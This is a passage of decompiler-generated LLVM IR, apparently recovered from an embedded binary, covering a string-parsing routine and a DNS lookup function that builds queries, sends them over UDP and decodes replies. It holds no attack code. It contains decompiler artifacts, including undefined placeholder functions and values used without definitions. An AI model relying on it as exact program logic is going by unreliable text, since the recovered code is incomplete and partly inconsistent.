dec_label_pc_10012ec4:                            ; preds = %dec_label_pc_10012eb4, %dec_label_pc_10012eac
  %v1_10012f14 = phi i32 [ %v1_10012eb4, %dec_label_pc_10012eb4 ], [ 0, %dec_label_pc_10012eac ]
  %v0_10012efc = phi i32 [ %v1_10012eb8, %dec_label_pc_10012eb4 ], [ %v0_10012e94, %dec_label_pc_10012eac ]
  %v1_10012ec4 = inttoptr i32 %v0_10012efc to i8*
  %v2_10012ec4 = load i8, i8* %v1_10012ec4, align 1
  %v3_10012ec4 = zext i8 %v2_10012ec4 to i32
  %v1_10012ecc = mul nuw nsw i32 %v3_10012ec4, 2
  %v2_10012ed4 = add i32 %v1_10012ecc, %v3_10012e98.pre
  %v3_10012ed4 = inttoptr i32 %v2_10012ed4 to i16*
  %v4_10012ed4 = load i16, i16* %v3_10012ed4, align 2
  %v5_10012ed4 = zext i16 %v4_10012ed4 to i32
  %v1_10012ed8 = and i32 %v5_10012ed4, 8
  %v3_10012ed8 = icmp eq i32 %v1_10012ed8, 0
  br i1 %v3_10012ed8, label %dec_label_pc_10012ee0, label %dec_label_pc_10012eb4

dec_label_pc_10012ee0:                            ; preds = %dec_label_pc_10012ec4
  %v2_10012ee0 = icmp sgt i32 %v0_10012f10, 3
  br i1 %v2_10012ee0, label %dec_label_pc_10012ef8, label %dec_label_pc_10012ee8

dec_label_pc_10012ee8:                            ; preds = %dec_label_pc_10012ee0
  %v3_10012ee8 = icmp eq i8 %v2_10012ec4, 46
  br i1 %v3_10012ee8, label %dec_label_pc_10012ef0, label %dec_label_pc_10012f34

dec_label_pc_10012ef0:                            ; preds = %dec_label_pc_10012ee8
  %v1_10012ef0 = add i32 %v0_10012efc, 1
  br label %dec_label_pc_10012f0c

dec_label_pc_10012ef8:                            ; preds = %dec_label_pc_10012ee0
  %v3_10012ef8 = icmp eq i8 %v2_10012ec4, 0
  %v1_10012efc = add i32 %v0_10012efc, 1
  br i1 %v3_10012ef8, label %dec_label_pc_10012f0c, label %dec_label_pc_10012f04

dec_label_pc_10012f04:                            ; preds = %dec_label_pc_10012ef8
  %v1_10012f04 = and i32 %v5_10012ed4, 32
  %v3_10012f04 = icmp eq i32 %v1_10012f04, 0
  br i1 %v3_10012f04, label %dec_label_pc_10012f34, label %dec_label_pc_10012f0c

dec_label_pc_10012f0c:                            ; preds = %dec_label_pc_10012f04, %dec_label_pc_10012ef8, %dec_label_pc_10012ef0
  %v0_10012e943 = phi i32 [ %v1_10012efc, %dec_label_pc_10012f04 ], [ %v1_10012efc, %dec_label_pc_10012ef8 ], [ %v1_10012ef0, %dec_label_pc_10012ef0 ]
  %v1_10012f0c = mul i32 %v0_10012f0c, 256
  %v1_10012f10 = add nuw nsw i32 %v0_10012f10, 1
  %v2_10012f14 = or i32 %v1_10012f14, %v1_10012f0c
  store i32 %v2_10012f14, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10012f10, 5
  br i1 %tmp10, label %dec_label_pc_10012e94, label %dec_label_pc_10012f20

dec_label_pc_10012f20:                            ; preds = %dec_label_pc_10012f0c
  %v0_10012f20 = load i32, i32* @r4, align 4
  %v3_10012f20 = icmp eq i32 %v0_10012f20, 0
  %v0_10012f28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012f20, i32 %v0_10012f28)
  %v0_10012f2c = load i32, i32* %r5.global-to-local, align 4
  %v1_10012f2c = load i32, i32* @r4, align 4
  %v2_10012f2c = inttoptr i32 %v1_10012f2c to i32*
  store i32 %v0_10012f2c, i32* %v2_10012f2c, align 4
  ret i32 1

dec_label_pc_10012f34:                            ; preds = %dec_label_pc_10012ee8, %dec_label_pc_10012f04, %dec_label_pc_10012e94, %dec_label_pc_10012eb4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10012f14, { 1, 0 }
  uselistorder i32 %v1_10012f10, { 1, 0 }
  uselistorder i32 %v0_10012efc, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10012f34, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10012e94, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10012f40 = load i32, i32* @lr, align 4
  store i32 %v0_10012f40, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268513132, i32* @lr, align 4
  %v1_10012f68 = call i32 @malloc(i32 512)
  store i32 %v1_10012f68, i32* @r30, align 4
  store i32 268513144, i32* @lr, align 4
  %v1_10012f74 = call i32 @malloc(i32 1025)
  %v0_10012f78 = load i32, i32* @r30, align 4
  %v3_10012f78 = icmp eq i32 %v0_10012f78, 0
  store i32 %v1_10012f74, i32* @r21, align 4
  br i1 %v3_10012f78, label %dec_label_pc_10013534, label %dec_label_pc_10012f84

dec_label_pc_10012f84:                            ; preds = %entry
  %v3_10012f84 = icmp eq i32 %v1_10012f74, 0
  br i1 %v3_10012f84, label %dec_label_pc_10013534, label %dec_label_pc_10012f8c

dec_label_pc_10012f8c:                            ; preds = %dec_label_pc_10012f84
  %v0_10012f8c = load i32, i32* @r23, align 4
  %v3_10012f8c = icmp eq i32 %v0_10012f8c, 0
  br i1 %v3_10012f8c, label %dec_label_pc_10013534, label %dec_label_pc_10012f94

dec_label_pc_10012f94:                            ; preds = %dec_label_pc_10012f8c
  %v0_10012f94 = load i32, i32* %r14.global-to-local, align 4
  %v1_10012f94 = inttoptr i32 %v0_10012f94 to i8*
  %v2_10012f94 = load i8, i8* %v1_10012f94, align 1
  %v3_10012f94 = zext i8 %v2_10012f94 to i32
  store i32 %v3_10012f94, i32* %r0.global-to-local, align 4
  %v3_10012f98 = icmp eq i8 %v2_10012f94, 0
  br i1 %v3_10012f98, label %dec_label_pc_10013534, label %dec_label_pc_10012fa0

dec_label_pc_10012fa0:                            ; preds = %dec_label_pc_10012f94
  store i32 %v0_10012f94, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  %v0_10012fa8 = call i32 @__GI_strlen()
  %v0_10012fb0 = load i32, i32* %r14.global-to-local, align 4
  %v2_10012fb0 = add i32 %v0_10012fb0, %v0_10012fa8
  %v1_10012fb8 = add i32 %v2_10012fb0, -1
  %v2_10012fb8 = inttoptr i32 %v1_10012fb8 to i8*
  %v3_10012fb8 = load i8, i8* %v2_10012fb8, align 1
  %v4_10012fb8 = zext i8 %v3_10012fb8 to i32
  store i32 %v4_10012fb8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10032b88.1130 to i32), i32* %r29.global-to-local, align 4
  %v2_10012fc0 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10012fc0, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v1_10012fcc = xor i32 %v4_10012fb8, 46
  store i32 %v1_10012fcc, i32* %r17.global-to-local, align 4
  %v0_10012fd0 = call i32 @__pthread_return_void()
  %v0_10012fd8 = call i32 @__pthread_return_0()
  %v3_10012fe0 = load i32, i32* @global_var_1002c948.1131, align 4
  store i32 %v3_10012fe0, i32* %r11.global-to-local, align 4
  %v3_10012fec = load i16, i16* @global_var_1002c85c.1132, align 2
  %v4_10012fec = zext i16 %v3_10012fec to i32
  store i32 %v4_10012fec, i32* @r25, align 4
  %v1_10012ff0 = load i32, i32* @r23, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10012ff0 = srem i32 %v3_10012fe0, %v1_10012ff0
  %v2_1001300c = sub i32 %v3_10012fe0, %v2_10012ff0
  store i32 %v2_1001300c, i32* %r0.global-to-local, align 4
  store i32 %v2_10012ff0, i32* @r26, align 4
  %v0_10013014 = call i32 @__pthread_return_void()
  %v0_10013528.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10013528.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1001301c.lr.ph.lr.ph, label %dec_label_pc_10013540

dec_label_pc_1001301c.lr.ph.lr.ph:                ; preds = %dec_label_pc_10012fa0
  %v2_10013034 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10013148 = ptrtoint i32* %stack_var_-204 to i32
  %v2_100131a8 = ptrtoint i16* %stack_var_-212 to i32
  %v2_100131ec = ptrtoint i32* %stack_var_-248 to i32
  %v3_10013248 = icmp eq i32 %tmp37, 0
  %v3_10013254 = icmp eq i32 %tmp36, 3
  %v2_100132d0 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10013324 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10013350 = icmp eq i32 %tmp33, 0
  %v3_100132c4 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1001301c.lr.ph

dec_label_pc_1001301c:                            ; preds = %dec_label_pc_1001301c.lr.ph, %dec_label_pc_100131cc
  %v0_1001301c = load i32, i32* @r19, align 4
  %v3_1001301c = icmp eq i32 %v0_1001301c, -1
  br i1 %v3_1001301c, label %dec_label_pc_1001302c, label %dec_label_pc_10013024

dec_label_pc_10013024:                            ; preds = %dec_label_pc_1001301c
  store i32 268513324, i32* @lr, align 4
  %v1_10013028 = call i32 @__libc_close(i32 %v0_1001301c)
  br label %dec_label_pc_1001302c

dec_label_pc_1001302c:                            ; preds = %dec_label_pc_1001301c, %dec_label_pc_10013024
  store i32 %v2_10013034, i32* %r29.global-to-local, align 4
  %v0_10013038 = load i32, i32* @r30, align 4
  store i32 268513344, i32* @lr, align 4
  %v3_1001303c = call i32 @__GI_memset(i32 %v0_10013038, i32 0, i32 512)
  store i32 268513360, i32* @lr, align 4
  %v3_1001304c = call i32 @__GI_memset(i32 %v2_10013034, i32 0, i32 48)
  %v0_10013050 = load i32, i32* @r25, align 4
  %v1_10013050 = add i32 %v0_10013050, 1
  %v1_10013054 = urem i32 %v1_10013050, 65536
  store i32 %v1_10013054, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013060 = load i32, i32* @r30, align 4
  store i32 %v1_10013054, i32* %stack_var_-144, align 4
  %v4_10013074 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10013060, i32 512)
  store i32 %v4_10013074, i32* %r28.global-to-local, align 4
  %v1_10013078 = icmp slt i32 %v4_10013074, 0
  br i1 %v1_10013078, label %dec_label_pc_10013540, label %dec_label_pc_10013080

dec_label_pc_10013080:                            ; preds = %dec_label_pc_1001302c
  %v0_10013080 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10013080, i32* @r4, align 4
  %v0_10013088 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268513428, i32* @lr, align 4
  %v4_10013090 = call i32 @strncpy(i32 %v0_10013088, i32 %v0_10013080, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v0_100130a8 = call i32 @__pthread_return_void()
  %v0_100130b0 = call i32 @__pthread_return_0()
  %v0_100130b4 = load i32, i32* @r22, align 4
  %v1_100130b4 = icmp slt i32 %v0_100130b4, 0
  %v0_100130bc = load i32, i32* @r26, align 4
  %v1_100130bc = mul i32 %v0_100130bc, 4
  store i32 %v1_100130bc, i32* %r0.global-to-local, align 4
  %v2_100130c0 = add i32 %v1_100130bc, %arg4
  %v3_100130c0 = inttoptr i32 %v2_100130c0 to i32*
  %v4_100130c0 = load i32, i32* %v3_100130c0, align 4
  store i32 %v4_100130c0, i32* %r29.global-to-local, align 4
  br i1 %v1_100130b4, label %dec_label_pc_10013108, label %dec_label_pc_100130c8

dec_label_pc_100130c8:                            ; preds = %dec_label_pc_10013080
  %v3_100130cc = load i32, i32* @global_var_1002c950.1134, align 4
  store i32 %v3_100130cc, i32* %r0.global-to-local, align 4
  %v2_100130d0 = icmp slt i32 %v0_100130b4, %v3_100130cc
  br i1 %v2_100130d0, label %dec_label_pc_100130d8, label %dec_label_pc_10013108

dec_label_pc_100130d8:                            ; preds = %dec_label_pc_100130c8
  store i32 ptrtoint (i32* @global_var_1001c300.1135 to i32), i32* @r4, align 4
  %v0_100130e4 = load i32, i32* @r21, align 4
  store i32 268513516, i32* @lr, align 4
  %v4_100130e8 = inttoptr i32 %v0_100130e4 to i8*
  %v5_100130e8 = call i32 @__GI_strncat(i8* %v4_100130e8, i32 ptrtoint (i32* @global_var_1001c300.1135 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_100130f0 = load i32, i32* @r22, align 4
  %v1_100130f0 = mul i32 %v0_100130f0, 4
  store i32 %v1_100130f0, i32* %r0.global-to-local, align 4
  %v2_100130f8 = add i32 %v1_100130f0, ptrtoint (i32* @global_var_10032c38.1136 to i32)
  %v3_100130f8 = inttoptr i32 %v2_100130f8 to i32*
  %v4_100130f8 = load i32, i32* %v3_100130f8, align 4
  store i32 %v4_100130f8, i32* @r4, align 4
  %v0_100130fc = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013108.1137 to i32), i32* @lr, align 4
  %v4_10013104 = inttoptr i32 %v0_100130fc to i8*
  %v5_10013104 = call i32 @__GI_strncat(i8* %v4_10013104, i32 %v4_100130f8, i32 1025, i32 ptrtoint (i32* @global_var_10032c38.1136 to i32))
  br label %dec_label_pc_10013108

dec_label_pc_10013108:                            ; preds = %dec_label_pc_100130c8, %dec_label_pc_10013080, %dec_label_pc_100130d8
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v0_10013110 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1001311c = load i32, i32* @r30, align 4
  %v1_1001311c = load i32, i32* %r28.global-to-local, align 4
  %v2_1001311c = add i32 %v1_1001311c, %v0_1001311c
  %v1_10013120 = sub i32 512, %v1_1001311c
  %v0_10013128 = load i32, i32* @r21, align 4
  store i32 %v0_10013128, i32* %stack_var_-240, align 4
  store i32 268513588, i32* @lr, align 4
  %v4_10013130 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_1001311c, i32 %v1_10013120)
  store i32 %v4_10013130, i32* @r27, align 4
  %v1_10013134 = icmp slt i32 %v4_10013130, 0
  br i1 %v1_10013134, label %dec_label_pc_10013540, label %dec_label_pc_1001313c

dec_label_pc_1001313c:                            ; preds = %dec_label_pc_10013108
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10013144 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268513620, i32* @lr, align 4
  %v3_10013150 = inttoptr i32 %v0_10013144 to i8*
  %v4_10013150 = call i32 @inet_pton(i32 10, i8* %v3_10013150, i32 %v2_10013148)
  %tmp59 = icmp slt i32 %v4_10013150, 1
  br i1 %tmp59, label %dec_label_pc_10013164thread-pre-split, label %dec_label_pc_1001315c

dec_label_pc_1001315c:                            ; preds = %dec_label_pc_1001313c
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10013164

dec_label_pc_10013164thread-pre-split:            ; preds = %dec_label_pc_1001313c
  %v3_10013164.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10013164

dec_label_pc_10013164:                            ; preds = %dec_label_pc_10013164thread-pre-split, %dec_label_pc_1001315c
  %v3_10013164 = phi i16 [ %v3_10013164.pr, %dec_label_pc_10013164thread-pre-split ], [ 10, %dec_label_pc_1001315c ]
  %v3_10013168 = icmp eq i16 %v3_10013164, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10013168, label %dec_label_pc_10013190, label %dec_label_pc_1001317c

dec_label_pc_1001317c:                            ; preds = %dec_label_pc_10013164
  %v0_10013180 = load i32, i32* @r29, align 4
  store i32 268513676, i32* @lr, align 4
  %v1_10013188 = call i32 @inet_addr(i32 %v0_10013180)
  %v3_10013190.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10013190

dec_label_pc_10013190:                            ; preds = %dec_label_pc_10013164, %dec_label_pc_1001317c
  %v3_10013190 = phi i16 [ 10, %dec_label_pc_10013164 ], [ %v3_10013190.pre, %dec_label_pc_1001317c ]
  %v4_10013190 = sext i16 %v3_10013190 to i32
  store i32 268513696, i32* @lr, align 4
  %v3_1001319c = call i32 @socket(i32 %v4_10013190, i32 2, i32 17)
  store i32 %v3_1001319c, i32* @r19, align 4
  %v1_100131a0 = icmp slt i32 %v3_1001319c, 0
  br i1 %v1_100131a0, label %dec_label_pc_100131cc, label %dec_label_pc_100131a8

dec_label_pc_100131a8:                            ; preds = %dec_label_pc_10013190
  store i32 268513716, i32* @lr, align 4
  %v3_100131b0 = call i32 @__libc_connect(i32 %v2_100131a8, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_100131b0, -1
  br i1 %tmp60, label %dec_label_pc_100131d4, label %dec_label_pc_100131bc

dec_label_pc_100131bc:                            ; preds = %dec_label_pc_100131a8
  %v0_100131bc = call i32 @__errno_location()
  %v1_100131c0 = inttoptr i32 %v0_100131bc to i32*
  %v2_100131c0 = load i32, i32* %v1_100131c0, align 4
  store i32 %v2_100131c0, i32* %r0.global-to-local, align 4
  %v3_100131c4 = icmp eq i32 %v2_100131c0, 101
  br i1 %v3_100131c4, label %dec_label_pc_1001350c, label %dec_label_pc_100131cc

dec_label_pc_100131cc:                            ; preds = %dec_label_pc_100131bc, %dec_label_pc_10013190
  %v0_100131cc = load i32, i32* %r18.global-to-local, align 4
  %v1_100131cc = add i32 %v0_100131cc, 1
  store i32 %v1_100131cc, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_100131cc, 3
  br i1 %tmp61, label %dec_label_pc_1001301c, label %dec_label_pc_10013540

dec_label_pc_100131d4:                            ; preds = %dec_label_pc_100131a8
  %v0_100131d4 = load i32, i32* @r28, align 4
  %v1_100131d4 = load i32, i32* @r27, align 4
  %v2_100131d4 = add i32 %v1_100131d4, %v0_100131d4
  %v0_100131d8 = load i32, i32* @r30, align 4
  %v0_100131e0 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_100131e8.1139 to i32), i32* @lr, align 4
  %v4_100131e4 = call i32 @__libc_send(i32 %v0_100131e0, i32 %v0_100131d8, i32 %v2_100131d4, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100131fc = load i32, i32* @r19, align 4
  store i32 %v0_100131fc, i32* %stack_var_-248, align 4
  store i32 268513796, i32* @lr, align 4
  %v3_10013200 = call i32 @__libc_poll(i32 %v2_100131ec, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10013200, 1
  br i1 %tmp62, label %dec_label_pc_1001350c, label %dec_label_pc_1001320c

dec_label_pc_1001320c:                            ; preds = %dec_label_pc_100131d4
  %v0_1001320c = load i32, i32* @r19, align 4
  %v0_10013210 = load i32, i32* @r30, align 4
  store i32 268513824, i32* @lr, align 4
  %v4_1001321c = call i32 @__libc_recv(i32 %v0_1001320c, i32 %v0_10013210, i32 512, i32 0)
  store i32 %v4_1001321c, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1001321c, 12
  br i1 %tmp63, label %dec_label_pc_100134b4, label %dec_label_pc_1001322c

dec_label_pc_1001322c:                            ; preds = %dec_label_pc_1001320c
  %v0_1001322c = load i32, i32* @r30, align 4
  %v2_10013234 = inttoptr i32 %v0_1001322c to i8*
  %v3_10013234 = call i32 @__decode_header(i8* %v2_10013234, i32 %v2_10013034)
  %v3_10013238 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10013238, i32* @r20, align 4
  %v1_1001323c = load i32, i32* @r25, align 4
  %v4_1001323c = icmp eq i32 %v3_10013238, %v1_1001323c
  br i1 %v4_1001323c, label %dec_label_pc_10013244, label %dec_label_pc_100134b4

dec_label_pc_10013244:                            ; preds = %dec_label_pc_1001322c
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10013248, label %dec_label_pc_100134b4, label %dec_label_pc_10013250

dec_label_pc_10013250:                            ; preds = %dec_label_pc_10013244
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_10013254, label %dec_label_pc_1001325c, label %dec_label_pc_100132c4

dec_label_pc_1001325c:                            ; preds = %dec_label_pc_10013250
  %v0_1001325c = load i32, i32* %r17.global-to-local, align 4
  %v3_1001325c = icmp eq i32 %v0_1001325c, 0
  br i1 %v3_1001325c, label %dec_label_pc_10013264, label %dec_label_pc_100132b8

dec_label_pc_10013264:                            ; preds = %dec_label_pc_1001325c
  store i32 ptrtoint (i32* @global_var_1002c860.1079 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012fc0, i32* %r28.global-to-local, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v0_10013280 = call i32 @__pthread_return_void()
  %v0_10013288 = call i32 @__pthread_return_0()
  %v3_10013290 = load i32, i32* @global_var_1002c950.1134, align 4
  store i32 %v2_10012fc0, i32* @r3, align 4
  %v1_1001329c = add i32 %v3_10013290, -1
  store i32 %v1_1001329c, i32* %r29.global-to-local, align 4
  %v0_100132a0 = call i32 @__pthread_return_void()
  %v0_100132a4 = load i32, i32* @r22, align 4
  %v2_100132a4 = icmp slt i32 %v0_100132a4, %v1_1001329c
  br i1 %v2_100132a4, label %dec_label_pc_100132ac, label %dec_label_pc_100132b8

dec_label_pc_100132ac:                            ; preds = %dec_label_pc_10013264
  %v1_100132ac = add i32 %v0_100132a4, 1
  store i32 %v1_100132ac, i32* @r22, align 4
  %v0_100132b0 = load i32, i32* @r20, align 4
  store i32 %v0_100132b0, i32* @r25, align 4
  br label %dec_label_pc_10013528thread-pre-split.backedge

dec_label_pc_100132b8:                            ; preds = %dec_label_pc_10013264, %dec_label_pc_1001325c
  %v0_100132b8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_100132ec

dec_label_pc_100132c4:                            ; preds = %dec_label_pc_10013250
  br i1 %v3_100132c4, label %dec_label_pc_100132cc, label %dec_label_pc_100134b4

dec_label_pc_100132cc:                            ; preds = %dec_label_pc_100132c4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_100132e4, label %dec_label_pc_100132d8

dec_label_pc_100132d8:                            ; preds = %dec_label_pc_100132cc
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001330410 = load i32, i32* @r30, align 4
  store i32 %v0_1001330410, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100132f4

dec_label_pc_100132e4:                            ; preds = %dec_label_pc_100132cc
  %v0_100132e4 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_100132ec

dec_label_pc_100132ec:                            ; preds = %dec_label_pc_100132b8, %dec_label_pc_100132e4
  %storemerge3 = phi i32 [ %v0_100132e4, %dec_label_pc_100132e4 ], [ %v0_100132b8, %dec_label_pc_100132b8 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_100132e4 ], [ 1, %dec_label_pc_100132b8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_100132ec = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_100132ec, align 4
  br label %dec_label_pc_10013550

dec_label_pc_100132f4:                            ; preds = %dec_label_pc_100132d8, %dec_label_pc_100132f4
  %v0_1001330414 = phi i32 [ %v0_1001330410, %dec_label_pc_100132d8 ], [ %v0_10013304, %dec_label_pc_100132f4 ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_100132d8 ], [ %v2_100132f8, %dec_label_pc_100132f4 ]
  store i32 268514040, i32* @lr, align 4
  %v2_100132f4 = call i32 @__length_question(i32 %v0_1001330414, i32 %storemerge213)
  %v0_100132f8 = load i32, i32* %r28.global-to-local, align 4
  %v2_100132f8 = add i32 %v0_100132f8, %v2_100132f4
  %v0_10013308.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_100132f8, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_100132f8, i32* @r4, align 4
  %v0_10013304 = load i32, i32* @r30, align 4
  store i32 %v0_10013304, i32* @r3, align 4
  %v2_10013308 = icmp slt i32 %v0_10013308.pr, 1
  %v1_1001330c = add i32 %v0_10013308.pr, 1
  store i32 %v1_1001330c, i32* %r29.global-to-local, align 4
  br i1 %v2_10013308, label %dec_label_pc_100132f4, label %dec_label_pc_10013314

dec_label_pc_10013314:                            ; preds = %dec_label_pc_100132f4
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_100132d0, label %dec_label_pc_10013460, label %dec_label_pc_10013468

dec_label_pc_10013324:                            ; preds = %dec_label_pc_10013460
  store i32 %v2_10013324, i32* %r29.global-to-local, align 4
  %v0_10013328 = load i32, i32* @r30, align 4
  store i32 268514108, i32* @lr, align 4
  %v5_10013338 = call i32 @__decode_answer(i32 %v0_10013328, i32 %v0_1001332c, i32 %v1_10013460, i32* nonnull %stack_var_-184)
  store i32 %v5_10013338, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10013338, -1
  br i1 %tmp64, label %dec_label_pc_1001335c, label %dec_label_pc_10013344

dec_label_pc_10013344:                            ; preds = %dec_label_pc_10013324
  %v0_10013344 = load i32, i32* @r24, align 4
  %v3_10013344 = icmp eq i32 %v0_10013344, 0
  br i1 %v3_10013344, label %dec_label_pc_100134b4, label %dec_label_pc_1001334c

dec_label_pc_1001334c:                            ; preds = %dec_label_pc_10013344
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10013350, label %dec_label_pc_100134b4, label %dec_label_pc_10013468

dec_label_pc_1001335c:                            ; preds = %dec_label_pc_10013324
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10013360 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10013360, label %dec_label_pc_10013404, label %dec_label_pc_10013368

dec_label_pc_10013368:                            ; preds = %dec_label_pc_1001335c
  %v0_10013368 = load i32, i32* @r31, align 4
  store i32 %v2_10013324, i32* @r4, align 4
  %v1_10013370 = add i32 %v0_10013368, 28
  %v2_10013370 = inttoptr i32 %v1_10013370 to i32*
  %v3_10013370 = load i32, i32* %v2_10013370, align 4
  store i32 %v3_10013370, i32* %r0.global-to-local, align 4
  store i32 %v0_10013368, i32* @r3, align 4
  %v1_10013378 = add i32 %v0_10013368, 36
  %v2_10013378 = inttoptr i32 %v1_10013378 to i32*
  %v3_10013378 = load i32, i32* %v2_10013378, align 4
  store i32 %v3_10013378, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268514192, i32* @lr, align 4
  %v0_1001338c = call i32 @memcpy()
  %v0_10013390 = load i32, i32* @r31, align 4
  %v1_10013390 = add i32 %v0_10013390, 4
  %v2_10013390 = inttoptr i32 %v1_10013390 to i32*
  %v3_10013390 = load i32, i32* %v2_10013390, align 4
  %v3_10013394 = icmp eq i32 %v3_10013390, 24
  br i1 %v3_10013394, label %dec_label_pc_10013368.dec_label_pc_100133b8_crit_edge, label %dec_label_pc_1001339c

dec_label_pc_10013368.dec_label_pc_100133b8_crit_edge: ; preds = %dec_label_pc_10013368
  %v1_100133b8.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_100133b8

dec_label_pc_1001339c:                            ; preds = %dec_label_pc_10013368
  %v1_1001339c = add i32 %v0_10013390, 28
  %v2_1001339c = inttoptr i32 %v1_1001339c to i32*
  %v3_1001339c = load i32, i32* %v2_1001339c, align 4
  store i32 %v3_1001339c, i32* %r0.global-to-local, align 4
  %v3_100133a0 = icmp eq i32 %v3_1001339c, 0
  br i1 %v3_100133a0, label %dec_label_pc_10013468, label %dec_label_pc_100133a8

dec_label_pc_100133a8:                            ; preds = %dec_label_pc_1001339c
  %v0_100133a8 = load i32, i32* %r16.global-to-local, align 4
  %v3_100133a8 = icmp eq i32 %v0_100133a8, 1
  br i1 %v3_100133a8, label %dec_label_pc_100133b8, label %dec_label_pc_100133b0

dec_label_pc_100133b0:                            ; preds = %dec_label_pc_100133a8
